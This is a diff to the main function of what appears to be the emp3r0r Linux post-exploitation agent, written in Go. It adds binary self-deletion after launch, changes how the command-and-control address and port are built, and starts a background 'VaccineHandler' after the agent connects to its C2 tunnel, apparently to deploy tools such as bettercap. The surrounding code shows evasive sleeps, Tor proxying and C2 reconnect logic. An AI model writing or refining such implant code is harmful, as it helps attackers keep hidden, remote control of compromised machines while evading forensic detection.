@@ -43,6 +43,12 @@ func main() {
 		return
 	}
 
+	// self delete
+	err = os.Remove(os.Args[0])
+	if err != nil {
+		log.Printf("Self delete: %v", err)
+	}
+
 	// don't be hasty
 	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
 
@@ -52,6 +58,13 @@ func main() {
 		if err != nil {
 			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
 		}
+	}
+
+	// use absolute path
+	pwd, err := os.Getwd()
+	if err == nil {
+		emp3r0r_data.AgentRoot = pwd + "/" + emp3r0r_data.AgentRoot
+		emp3r0r_data.UtilsPath = pwd + "/" + emp3r0r_data.UtilsPath
 	}
 
 	// silent switch
@@ -140,12 +153,7 @@ func main() {
 
 	// parse C2 address
 	emp3r0r_data.CCIP = strings.Split(emp3r0r_data.CCAddress, "/")[2]
-	// if not using IP as C2, we assume CC is proxied by CDN/tor, thus using default 443 port
-	if tun.ValidateIP(emp3r0r_data.CCIP) {
-		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, emp3r0r_data.CCPort)
-	} else {
-		emp3r0r_data.CCAddress += "/"
-	}
+	emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, emp3r0r_data.CCPort)
 
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_data.CCAddress) {
@@ -310,6 +318,9 @@ connect:
 		goto connect
 	}
 	log.Println("Connected to CC TunAPI")
+	if !util.IsFileExist(emp3r0r_data.UtilsPath + "/bettercap") {
+		go agent.VaccineHandler()
+	}
 	err = agent.CCMsgTun(ctx, cancel)
 	if err != nil {
 		log.Printf("CCMsgTun: %v, reconnecting...", err)
